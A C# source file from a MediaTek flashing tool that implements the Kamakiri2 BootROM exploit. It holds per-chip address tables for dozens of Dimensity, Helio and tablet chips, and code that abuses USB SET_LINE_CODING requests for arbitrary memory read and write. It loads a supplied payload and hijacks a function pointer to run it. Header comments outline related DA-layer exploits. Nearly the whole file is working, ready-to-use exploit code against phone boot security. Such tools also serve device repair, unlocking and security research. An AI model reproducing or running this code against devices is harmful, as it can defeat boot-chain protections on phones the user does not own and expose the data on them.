// ============================================================================
// SakuraEDL - Kamakiri2 Exploit | Kamakiri2 漏洞利用
// ============================================================================
// [ZH] Kamakiri2 漏洞 - BROM 层堆栈缓冲区溢出漏洞利用
// [EN] Kamakiri2 Exploit - BROM layer stack buffer overflow exploit
// [JA] Kamakiri2エクスプロイト - BROMレイヤーのスタックバッファオーバーフロー
// [KO] Kamakiri2 익스플로잇 - BROM 레이어 스택 버퍼 오버플로우
// [RU] Эксплойт Kamakiri2 - Переполнение буфера стека уровня BROM
// [ES] Exploit Kamakiri2 - Desbordamiento de buffer de pila en BROM
// ============================================================================
// Based on mtkclient by B.Kerler (GPLv3) and MTKAuthBypassQT
// Copyright (c) 2025-2026 SakuraEDL | Licensed under CC BY-NC-SA 4.0
// ============================================================================
// 
// ╔═══════════════════════════════════════════════════════════════════════════╗
// ║                      MTK 漏洞层级说明                                      ║
// ╠═══════════════════════════════════════════════════════════════════════════╣
// ║ 层级    │ 漏洞名称          │ 原理                                        ║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ BROM    │ Kamakiri2         │ USB CDC SET_LINE_CODING 任意内存读写        ║
// ║         │ (本文件)          │ 需要 USB 直接访问，绕过 BROM 安全检查       ║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ DA1     │ Carbonara         │ 运行时修改 DA1 内存中的 DA2 预期哈希        ║
// ║         │                   │ 通过 boot_to 命令写入，绕过 DA2 签名验证    ║
// ╠═════════╪═══════════════════╪═════════════════════════════════════════════╣
// ║ DA2     │ AllinoneSignature │ DA2 XML 编码函数缓冲区溢出                  ║
// ║         │                   │ 利用 source_file 触发溢出执行 shellcode     ║
// ╚═════════╧═══════════════════╧═════════════════════════════════════════════╝
//
// ═══════════════════════════════════════════════════════════════════════════
// ★★★ 重要: Kamakiri2 漏洞适用范围 ★★★
// ═══════════════════════════════════════════════════════════════════════════
//
// Kamakiri/Kamakiri2 漏洞 **只能在 BROM 模式 (PID=0x0003) 下触发**！
//
// mtkclient 源码证据 (kamakiri.py, kamakiri2.py):
//   udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)  // 只搜索 PID 0x0003
//
// 原因:
// 1. 漏洞存在于 BROM (Boot ROM) 的 USB CDC ACM 协议栈中
// 2. BROM 是芯片固化的代码，无法通过软件更新修复 (旧芯片)
// 3. Preloader 模式 (PID=0x2000/0x2001) 使用不同的 USB 协议栈
// 4. Preloader 可以被厂商更新，漏洞可能已修复
//
// 使用前必须检查:
// 1. 设备 PID 必须是 0x0003 (BROM 模式)
// 2. 芯片必须在支持列表中
// 3. 必须使用 libusb/WinUSB 直接访问 USB (串口无法触发漏洞)
//
// 如果设备在 Preloader 模式:
// - 可以尝试 "crash to BROM" 方法让设备重启到 BROM 模式
// - 或者使用 DA 层漏洞 (Carbonara/AllinoneSignature)
//
// ═══════════════════════════════════════════════════════════════════════════
// ============================================================================

using System;
using System.Threading;
using System.Threading.Tasks;
using SakuraEDL.MediaTek.Protocol;
using SakuraEDL.MediaTek.Common;
using SakuraEDL.MediaTek.Database;

namespace SakuraEDL.MediaTek.Exploit
{
    /// <summary>
    /// Kamakiri2 漏洞利用
    /// 通过 USB CDC SET_LINE_CODING 控制传输实现任意内存读写
    /// 
    /// ★★★ 重要: 此漏洞只能在 BROM 模式 (PID=0x0003) 下使用 ★★★
    /// </summary>
    public class Kamakiri2Exploit
    {
        private readonly BromClient _brom;
        private readonly Action<string> _log;

        // 芯片配置
        private uint _ptrDa;
        private uint _ptrSend;
        private uint _bromPayloadAddr;
        private uint _wdgAddr;

        // BROM 模式必需的 USB PID
        public const ushort BROM_PID = 0x0003;
        public const ushort MTK_VID = 0x0E8D;

        public bool IsExploited { get; private set; }
        public string LastError { get; private set; }

        public Kamakiri2Exploit(BromClient brom, Action<string> log = null)
        {
            _brom = brom;
            _log = log ?? delegate { };
        }
        
        /// <summary>
        /// 检查设备是否在 BROM 模式 (Kamakiri2 的必要条件)
        /// </summary>
        /// <param name="pid">设备的 USB PID</param>
        /// <returns>true 如果设备在 BROM 模式</returns>
        public static bool IsBromMode(ushort pid)
        {
            return pid == BROM_PID;
        }
        
        /// <summary>
        /// 验证设备是否可以使用 Kamakiri2 漏洞
        /// </summary>
        /// <param name="vid">USB VID</param>
        /// <param name="pid">USB PID</param>
        /// <param name="hwCode">芯片 HW Code</param>
        /// <param name="reason">如果不支持，返回原因</param>
        /// <returns>true 如果可以使用漏洞</returns>
        public static bool CanUseExploit(ushort vid, ushort pid, ushort hwCode, out string reason)
        {
            // 检查 VID
            if (vid != MTK_VID)
            {
                reason = $"不是 MTK 设备 (VID=0x{vid:X4})";
                return false;
            }
            
            // 检查 PID - 必须是 BROM 模式
            if (pid != BROM_PID)
            {
                reason = pid switch
                {
                    0x2000 or 0x2001 => "设备在 Preloader 模式，需要先切换到 BROM 模式",
                    0x2006 => "设备在 DA 模式，请考虑使用 Carbonara 漏洞",
                    _ => $"不支持的设备模式 (PID=0x{pid:X4})"
                };
                return false;
            }
            
            // 检查芯片是否支持
            if (!IsSupported(hwCode))
            {
                reason = $"芯片 0x{hwCode:X4} 不在 Kamakiri2 支持列表中";
                return false;
            }
            
            reason = null;
            return true;
        }

        /// <summary>
        /// 初始化芯片配置
        /// </summary>
        public bool Initialize(ushort hwCode)
        {
            var chipConfig = MtkChipDatabase.GetChip(hwCode);
            if (chipConfig == null)
            {
                LastError = $"未找到芯片配置: 0x{hwCode:X4}";
                return false;
            }

            // 获取漏洞所需地址
            _bromPayloadAddr = chipConfig.BromPayloadAddr;
            _wdgAddr = chipConfig.WatchdogAddr;

            // 获取 brom_register_access 和 send_ptr 配置
            // 这些值需要从芯片配置中获取
            var exploitConfig = GetExploitConfig(hwCode);
            if (exploitConfig == null)
            {
                LastError = $"芯片 0x{hwCode:X4} 不支持 Kamakiri2 漏洞";
                return false;
            }

            _ptrDa = exploitConfig.Value.ptrDa;
            _ptrSend = exploitConfig.Value.ptrSend;

            _log($"[Kamakiri2] 初始化完成:");
            _log($"  BROM Payload 地址: 0x{_bromPayloadAddr:X8}");
            _log($"  WDG 地址: 0x{_wdgAddr:X8}");
            _log($"  ptr_da: 0x{_ptrDa:X8}");
            _log($"  ptr_send: 0x{_ptrSend:X8}");

            return true;
        }

        /// <summary>
        /// 获取芯片的漏洞配置
        /// 数据来源: mtkclient brom_config.py, MTKAuthBypassQT
        /// </summary>
        private (uint ptrDa, uint ptrSend)? GetExploitConfig(ushort hwCode)
        {
            // 来自 mtkclient 和 MTKAuthBypassQT 的芯片配置
            // ptrDa: brom_register_access 地址
            // ptrSend: send_ptr 地址
            return hwCode switch
            {
                // ═══════════════════════════════════════════════════════════════
                // Dimensity 系列 (较新芯片)
                // ═══════════════════════════════════════════════════════════════
                
                // MT6833 (Dimensity 700)
                0x0813 => (0x102870, 0x106B54),
                0x6833 => (0x102870, 0x106B54),
                
                // MT6853 (Dimensity 720)
                0x0600 => (0x102870, 0x106B60),
                0x6853 => (0x102870, 0x106B60),
                
                // MT6873 (Dimensity 800/820)
                0x0788 => (0x102870, 0x106B60),
                0x6873 => (0x102870, 0x106B60),
                
                // MT6877 (Dimensity 900)
                0x0766 => (0x102870, 0x106B60),
                0x0959 => (0x102870, 0x106B60),  // Preloader 模式
                0x6877 => (0x102870, 0x106B60),
                
                // MT6885 (Dimensity 1000/1000+)
                0x0886 => (0x102870, 0x106B60),
                0x6885 => (0x102870, 0x106B60),
                
                // MT6891 (Dimensity 1100)
                0x0989 => (0x102870, 0x106B60),
                0x6891 => (0x102870, 0x106B60),
                
                // MT6893 (Dimensity 1200)
                0x0816 => (0x102870, 0x106B60),
                0x6893 => (0x102870, 0x106B60),
                
                // MT6895 (Dimensity 8000/8100/8200)
                0x0996 => (0x102870, 0x106B60),
                0x1172 => (0x102870, 0x106B60),
                0x6895 => (0x102870, 0x106B60),
                
                // ═══════════════════════════════════════════════════════════════
                // Helio 系列 (中端芯片)
                // ═══════════════════════════════════════════════════════════════
                
                // MT6781 (Helio G96)
                0x6781 => (0x102870, 0x106B54),
                
                // MT6765 (Helio P35/G35)
                0x0717 => (0x102760, 0x106490),
                0x0725 => (0x102760, 0x106490),
                0x6765 => (0x102760, 0x106490),
                
                // MT6768 (Helio G85)
                0x0551 => (0x102760, 0x106490),
                0x6768 => (0x102760, 0x106490),
                
                // MT6769 (Helio G80 变体)
                0x6769 => (0x102760, 0x106490),
                
                // MT6785 (Helio G90/G95)
                0x0588 => (0x102760, 0x106494),
                0x6785 => (0x102760, 0x106494),
                
                // MT6771 (Helio P60)
                0x0688 => (0x102760, 0x106490),
                0x6771 => (0x102760, 0x106490),
                
                // MT6779 (Helio P90)
                0x0507 => (0x102760, 0x106490),
                0x6779 => (0x102760, 0x106490),
                
                // MT6762 (Helio P22)
                0x0707 => (0x102760, 0x106490),
                0x6762 => (0x102760, 0x106490),
                
                // MT6761 (Helio A22)
                0x0562 => (0x102760, 0x106490),
                0x6761 => (0x102760, 0x106490),
                
                // MT6763 (Helio P23)
                0x0690 => (0x102760, 0x106490),
                0x6763 => (0x102760, 0x106490),
                
                // MT6739
                0x0699 => (0x102760, 0x106490),
                0x6739 => (0x102760, 0x106490),
                
                // ═══════════════════════════════════════════════════════════════
                // 旧芯片系列
                // ═══════════════════════════════════════════════════════════════
                
                // MT6755 (Helio P10)
                0x0326 => (0x102760, 0x106490),
                0x6755 => (0x102760, 0x106490),
                
                // MT6757 (Helio P20)
                0x0601 => (0x102760, 0x106490),
                0x6757 => (0x102760, 0x106490),
                
                // MT6797 (Helio X20/X25)
                0x0279 => (0x102760, 0x106490),
                0x6797 => (0x102760, 0x106490),
                
                // MT6735/MT6737
                0x0321 => (0x102760, 0x106490),
                0x0335 => (0x102760, 0x106490),
                0x6735 => (0x102760, 0x106490),
                0x6737 => (0x102760, 0x106490),
                
                // MT6752/MT6753
                0x6752 => (0x102760, 0x106490),
                0x6753 => (0x102760, 0x106490),
                
                // ═══════════════════════════════════════════════════════════════
                // 平板/IoT 芯片
                // ═══════════════════════════════════════════════════════════════
                
                // MT8163
                0x8163 => (0x102760, 0x106490),
                
                // MT8167
                0x8167 => (0x102760, 0x106490),
                
                // MT8168
                0x8168 => (0x102760, 0x106490),
                
                // MT8173
                0x8173 => (0x102760, 0x106490),
                
                // MT8183
                0x8183 => (0x102870, 0x106B54),
                
                _ => null
            };
        }
        
        /// <summary>
        /// 检查芯片是否支持 Kamakiri2 漏洞
        /// </summary>
        public static bool IsSupported(ushort hwCode)
        {
            var exploit = new Kamakiri2Exploit(null);
            return exploit.GetExploitConfig(hwCode) != null;
        }
        
        /// <summary>
        /// 获取所有支持 Kamakiri2 漏洞的芯片列表
        /// </summary>
        public static ushort[] GetSupportedChips()
        {
            return new ushort[]
            {
                // Dimensity 系列
                0x0813, 0x0600, 0x0788, 0x0766, 0x0959, 0x0886, 0x0989, 0x0816, 0x0996, 0x1172,
                // Helio 系列
                0x0717, 0x0725, 0x0551, 0x0588, 0x0688, 0x0507, 0x0707, 0x0562, 0x0690, 0x0699,
                // 旧芯片
                0x0326, 0x0601, 0x0279, 0x0321, 0x0335,
                // 平板芯片
                0x8163, 0x8167, 0x8168, 0x8173, 0x8183
            };
        }

        /// <summary>
        /// 执行 Kamakiri2 漏洞利用
        /// ★ 重要: 必须在 BROM 模式 (PID=0x0003) 下调用此方法
        /// </summary>
        /// <param name="payload">要执行的 payload</param>
        /// <param name="ct">取消令牌</param>
        /// <param name="skipModeCheck">跳过模式检查 (危险，仅供调试)</param>
        /// <returns>成功返回 true</returns>
        public async Task<bool> RunExploitAsync(byte[] payload, CancellationToken ct = default, bool skipModeCheck = false)
        {
            if (payload == null || payload.Length == 0)
            {
                LastError = "Payload 为空";
                return false;
            }

            _log($"[Kamakiri2] 开始执行漏洞利用, Payload 大小: {payload.Length} 字节");

            try
            {
                using var usb = new MtkUsbExploit(msg => _log(msg));

                // 1. 连接 USB 设备 (要求 BROM 模式)
                if (!usb.Connect(requireBromMode: !skipModeCheck))
                {
                    LastError = "无法连接 USB 设备 (需要 BROM 模式 PID=0x0003)";
                    return false;
                }
                
                // ★★★ 关键检查: 验证设备是否在 BROM 模式 ★★★
                if (!skipModeCheck && !usb.IsBromMode)
                {
                    var (vid, pid) = usb.GetDeviceIds();
                    LastError = pid switch
                    {
                        0x2000 or 0x2001 => "错误: 设备在 Preloader 模式 (PID=0x" + pid.ToString("X4") + ")，Kamakiri2 只能在 BROM 模式 (PID=0x0003) 下使用。\n建议: 尝试 crash to BROM 或使用 DA 层漏洞",
                        0x2006 => "错误: 设备在 DA 模式，请使用 Carbonara 或 AllinoneSignature 漏洞",
                        _ => $"错误: 不支持的设备模式 (PID=0x{pid:X4})，需要 BROM 模式 (PID=0x0003)"
                    };
                    _log($"[Kamakiri2] ❌ {LastError}");
                    return false;
                }
                
                _log($"[Kamakiri2] ✓ 设备在 {usb.GetModeDescription()}");

                // 2. 读取 ptr_send 的值
                _log("[Kamakiri2] 读取 ptr_send...");
                var ptrSendData = await BRomDaReadAsync(usb, _ptrSend, 4, ct);
                if (ptrSendData == null || ptrSendData.Length < 4)
                {
                    LastError = "无法读取 ptr_send";
                    return false;
                }

                uint ptrSend = MtkDataPacker.UnpackUInt32LE(ptrSendData, 0);
                _log($"[Kamakiri2] ptr_send 值: 0x{ptrSend:X8}");

                // 3. 写入 payload 到 BROM payload 地址
                _log($"[Kamakiri2] 写入 payload 到 0x{_bromPayloadAddr:X8}...");
                if (!await BRomDaWriteAsync(usb, _bromPayloadAddr, payload, true, ct))
                {
                    LastError = "无法写入 payload";
                    return false;
                }

                // 4. 修改函数指针，指向我们的 payload
                uint targetAddr = ptrSend + 8;
                var plAddrBytes = BitConverter.GetBytes(_bromPayloadAddr);
                _log($"[Kamakiri2] 修改函数指针 0x{targetAddr:X8} -> 0x{_bromPayloadAddr:X8}...");
                if (!await BRomDaWriteAsync(usb, targetAddr, plAddrBytes, false, ct))
                {
                    LastError = "无法修改函数指针";
                    return false;
                }

                // 5. 等待 payload 执行并检查 ACK
                await Task.Delay(100, ct);
                
                // 读取 ACK (通过串口)
                var ackData = await _brom.ReadBytesAsync(4, 3000, ct);
                if (ackData != null && ackData.Length >= 4)
                {
                    uint ack = MtkDataPacker.UnpackUInt32BE(ackData, 0);
                    _log($"[Kamakiri2] 收到 ACK: 0x{ack:X8}");

                    if (ack == 0xA1A2A3A4 || ack == 0xC1C2C3C4)
                    {
                        _log("[Kamakiri2] ✓ 漏洞利用成功!");
                        IsExploited = true;
                        return true;
                    }
                    else
                    {
                        LastError = $"ACK 错误: 0x{ack:X8}";
                        return false;
                    }
                }
                else
                {
                    // 尝试验证读取内存
                    var testRead = await BRomDaReadAsync(usb, 0x100000, 4, ct);
                    if (testRead != null && testRead.Length >= 4)
                    {
                        _log("[Kamakiri2] ✓ 漏洞利用成功 (通过内存读取验证)");
                        IsExploited = true;
                        return true;
                    }

                    LastError = "未收到 ACK";
                    return false;
                }
            }
            catch (Exception ex)
            {
                LastError = ex.Message;
                _log($"[Kamakiri2] 异常: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 通过 Kamakiri2 漏洞读取内存
        /// </summary>
        private async Task<byte[]> BRomDaReadAsync(MtkUsbExploit usb, uint addr, int len, CancellationToken ct)
        {
            // 初始化 brom_register_access
            if (!await BRomRegAccessInitAsync(ct))
                ClearSerialBuffer();

            // 读取看门狗寄存器 (保持活跃)
            if (!await BRomReadCmd32Async(_wdgAddr + 0x50, 1, true, 4, ct))
                ClearSerialBuffer();

            // 触发漏洞 - 修改 ptr_da
            for (int i = 0; i < 3; i++)
            {
                if (!usb.BRomUpdateLineCoding(_ptrDa + 8 - 3 + (uint)i))
                    return null;
                await Task.Delay(5, ct);
            }

            await Task.Delay(50, ct);
            ClearSerialBuffer();

            // 根据地址选择不同的读取方式
            if (addr < 0x40)
            {
                for (int i = 0; i < 4; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 6 + (uint)(4 - i)))
                        return null;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessReadAsync(addr, len, true, ct);
            }
            else
            {
                for (int i = 0; i < 3; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 5 + (uint)(3 - i)))
                        return null;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessReadAsync(addr - 0x40, len, true, ct);
            }
        }

        /// <summary>
        /// 通过 Kamakiri2 漏洞写入内存
        /// </summary>
        private async Task<bool> BRomDaWriteAsync(MtkUsbExploit usb, uint addr, byte[] data, bool checkResult, CancellationToken ct)
        {
            // 初始化 brom_register_access
            if (!await BRomRegAccessInitAsync(ct))
                ClearSerialBuffer();

            // 读取看门狗寄存器 (保持活跃)
            if (!await BRomReadCmd32Async(_wdgAddr + 0x50, 1, true, 4, ct))
                ClearSerialBuffer();

            // 触发漏洞 - 修改 ptr_da
            for (int i = 0; i < 3; i++)
            {
                if (!usb.BRomUpdateLineCoding(_ptrDa + 8 - 3 + (uint)i))
                    return false;
                await Task.Delay(5, ct);
            }

            await Task.Delay(50, ct);
            ClearSerialBuffer();

            // 根据地址选择不同的写入方式
            if (addr < 0x40)
            {
                for (int i = 0; i < 4; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 6 + (uint)(4 - i)))
                        return false;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessWriteAsync(addr, data, checkResult, ct);
            }
            else
            {
                for (int i = 0; i < 3; i++)
                {
                    if (!usb.BRomUpdateLineCoding(_ptrDa - 5 + (uint)(3 - i)))
                        return false;
                    await Task.Delay(5, ct);
                }
                return await BRomRegAccessWriteAsync(addr - 0x40, data, checkResult, ct);
            }
        }

        /// <summary>
        /// 初始化 brom_register_access
        /// </summary>
        private async Task<bool> BRomRegAccessInitAsync(CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xDA, ct)) return false;
            if (!await Write32EchoAsync(0, ct)) return false;
            if (!await Write32EchoAsync(0, ct)) return false;
            if (!await Write32EchoAsync(1, ct)) return false;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return false;

            var data = await _brom.ReadBytesAsync(1, 1000, ct);
            if (data == null || data.Length < 1) return false;

            ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            return ack == 0;
        }

        private void ClearSerialBuffer()
        {
            try { _brom.DiscardBuffers(); } catch { }
        }

        private async Task<bool> BRomReadCmd32Async(uint addr, uint count, bool read, uint len, CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xD1, ct))
                return false;

            if (!await Write32EchoAsync(addr, ct))
                return false;

            if (!await Write32EchoAsync(count, ct))
                return false;

            if (!read)
            {
                await _brom.ReadBytesAsync(2, 1000, ct);
                return true;
            }
            else
            {
                var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return false;

                var data = await _brom.ReadBytesAsync((int)len, 5000, ct);
                if (data == null) return false;

                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                return ack == 0;
            }
        }

        private async Task<byte[]> BRomRegAccessReadAsync(uint addr, int len, bool check, CancellationToken ct)
        {
            // 清空缓冲区
            await _brom.ReadBytesAsync(64, 50, ct);

            if (!await _brom.EchoByteAsync(0xDA, ct)) return null;
            if (!await Write32EchoAsync(0, ct)) return null;
            if (!await Write32EchoAsync(addr, ct)) return null;
            if (!await Write32EchoAsync((uint)len, ct)) return null;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return null;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return null;

            var data = await _brom.ReadBytesAsync(len, 5000, ct);
            if (data == null || data.Length < len) return null;

            if (check)
            {
                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return null;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return null;
            }

            return data;
        }

        private async Task<bool> BRomRegAccessWriteAsync(uint addr, byte[] data, bool check, CancellationToken ct)
        {
            if (!await _brom.EchoByteAsync(0xDA, ct)) return false;
            if (!await Write32EchoAsync(1, ct)) return false;
            if (!await Write32EchoAsync(addr, ct)) return false;
            if (!await Write32EchoAsync((uint)data.Length, ct)) return false;

            var ackData = await _brom.ReadBytesAsync(2, 1000, ct);
            if (ackData == null || ackData.Length < 2) return false;
            ushort ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
            if (ack != 0) return false;

            await _brom.WriteBytesAsync(data, ct);

            if (check)
            {
                ackData = await _brom.ReadBytesAsync(2, 1000, ct);
                if (ackData == null || ackData.Length < 2) return false;
                ack = MtkDataPacker.UnpackUInt16BE(ackData, 0);
                if (ack != 0) return false;
            }

            return true;
        }

        private async Task<bool> Write32EchoAsync(uint value, CancellationToken ct)
        {
            var data = new byte[4];
            MtkDataPacker.WriteUInt32BE(data, 0, value);
            return await _brom.EchoBytesAsync(data, ct);
        }
    }
}
